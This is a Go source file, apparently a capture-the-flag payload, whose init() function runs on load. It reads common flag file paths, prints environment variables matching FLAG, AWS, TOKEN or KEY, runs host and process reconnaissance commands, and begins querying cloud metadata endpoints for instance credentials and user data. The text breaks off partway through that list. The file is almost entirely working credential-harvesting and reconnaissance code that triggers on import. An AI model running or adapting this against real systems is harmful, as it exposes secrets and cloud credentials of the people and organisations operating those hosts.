package main

import (
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

// helper to run commands safely and return trimmed output
func runCmd(name string, args ...string) string {
	c := exec.Command(name, args...)
	out, err := c.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("COMMAND %s %v FAILED: %s | %v", name, args, strings.TrimSpace(string(out)), err)
	}
	return strings.TrimSpace(string(out))
}

func tryRead(path string) (string, error) {
	b, err := ioutil.ReadFile(path)
	if err != nil {
		return "", err
	}
	return string(b), nil
}

func getURL(url string, timeout time.Duration) (string, error) {
	client := &http.Client{
		Timeout: timeout,
	}
	resp, err := client.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	b, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(b), nil
}

func printHeader(name string) {
	fmt.Println("=== " + name + " ===")
}

func init() {
	// 1) Try common flag files
	paths := []string{"/flag", "/flag.txt", "/home/ctf/flag", "/root/flag", "/etc/flag"}
	for _, p := range paths {
		if s, err := tryRead(p); err == nil && len(s) > 0 {
			printHeader("FOUND_FLAG_FILE " + p)
			fmt.Println(s)
			return
		}
	}

	// 2) Environment inspection
	printHeader("ENV_VARS_FILTERED")
	for _, e := range os.Environ() {
		// only print envs likely to contain secrets to reduce noise
		if strings.Contains(strings.ToUpper(e), "FLAG") ||
			strings.Contains(strings.ToUpper(e), "AWS") ||
			strings.Contains(strings.ToUpper(e), "TOKEN") ||
			strings.Contains(strings.ToUpper(e), "KEY") {
			fmt.Println(e)
		}
	}

	// 3) Host info
	printHeader("HOST_INFO")
	fmt.Println("hostname:", runCmd("hostname"))
	fmt.Println("whoami/id:", runCmd("id"))
	fmt.Println("uname -a:", runCmd("uname", "-a"))

	// 4) Basic filesystem listing (root & home)
	printHeader("LS_ROOT")
	fmt.Println(runCmd("ls", "-la", "/"))
	printHeader("LS_HOME")
	fmt.Println(runCmd("ls", "-la", "/home"))

	// 5) Process list and network
	printHeader("PS_AUX")
	fmt.Println(runCmd("ps", "aux"))

	printHeader("NETSTAT_OR_IP")
	// try netstat, fall back to ip addr
	ns := runCmd("netstat", "-tunlp")
	if strings.Contains(ns, "failed") || ns == "" {
		ns = runCmd("ip", "addr")
	}
	fmt.Println(ns)

	// 6) Try to get cloud metadata (AWS / GCE)
	printHeader("CLOUD_METADATA")
	ips := []string{
		"http://169.254.169.254/latest/meta-data/",        // AWS
		"http://169.254.169.254/latest/user-data",         // AWS userdata
		"http://169.254.169.254/computeMetadata/v1/",      // GCP
		"http://169.254.169.254/metadata/instance",
